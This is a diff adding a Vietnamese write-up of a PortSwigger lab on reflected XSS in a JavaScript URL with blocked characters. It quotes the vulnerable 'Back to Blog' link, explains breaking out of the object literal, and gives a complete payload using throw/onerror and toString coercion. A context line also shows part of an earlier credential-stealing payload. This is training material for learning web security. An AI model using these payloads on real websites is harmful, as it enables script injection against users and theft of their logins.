@@ -372,3 +372,19 @@ body:username.value+':'+this.value
 
 ![image-45](images/image-45.png)
 
+### Lab: Reflected XSS in a JavaScript URL with some characters blocked
+Lỗ hỏng của lab này nằm ở chức năng quay về blog chính:
+```HTML
+<div class="is-linkback">
+                    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+```
+Giả dụ đường link của 1 bài blog là `https://<Lab-ID>/post?postId=5`, thì đoạn code trên sẽ lấy trực tiếp `/post?postId=5` từ URL. Khi này, ta có thể escape `{}` bằng cách: `https://<Lab-ID>/post?postId=5&'},...,{id:'`
+
+Trong bài viết [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons), có đề cập đến cách sử dụng throw để trigger alert bằng cách:
+```HTML
+<script>throw onerror=alert,'some string',123,'haha'</script>
+```
+
+Ta có thể áp dụng nó vào payload: `https://<Lab-ID>/post?postId=5&'},x=x=>{throw onerror=alert,1337},toString=x,window='',{x:'`. Vì script đang nằm trong `javascript:`, nên ta phải sử dụng `=>` để tạo function thì mới sử dụng được `throw`, còn lại `toString` và `window` có vai trò trigger function hoạt động bằng cách ép việc chuyển đổi sang string trong attribute `window`.
+
